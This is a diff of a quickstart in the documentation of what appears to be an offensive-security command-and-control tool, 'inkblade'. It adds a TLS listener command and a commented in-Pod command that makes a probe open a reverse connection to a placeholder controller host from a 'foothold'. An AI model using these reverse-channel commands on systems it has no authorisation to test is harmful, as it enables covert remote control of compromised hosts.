@@ -72,9 +72,14 @@ python -m inkblade up
 #    The console prints a one-time admin password and serves 127.0.0.1:8765.
 
 # 3. Attach an existing probe: the probe calls back to the controller
+python -m inkblade channel listen \
+  --bind 0.0.0.0 --port 9443 --transport tls \
+  --token-file ./probe.token --workspace local-lab
+#    In the Pod:
+#    ./inkblade-probe reverse --transport tls --host <controller> --port 9443 \
+#      --ca-file ca.pem --pin <sha256> --sni <name> \
+#      --token-file /tmp/probe.token --probe-id pod-a
 python -m inkblade probe list
-python -m inkblade channel listen
-#    In the Pod: inkblade-probe reverse --host <controller> --port <port>
 
 # 4. First delivery from a least-privilege foothold (outbound TCP only)
 python -m inkblade session open \
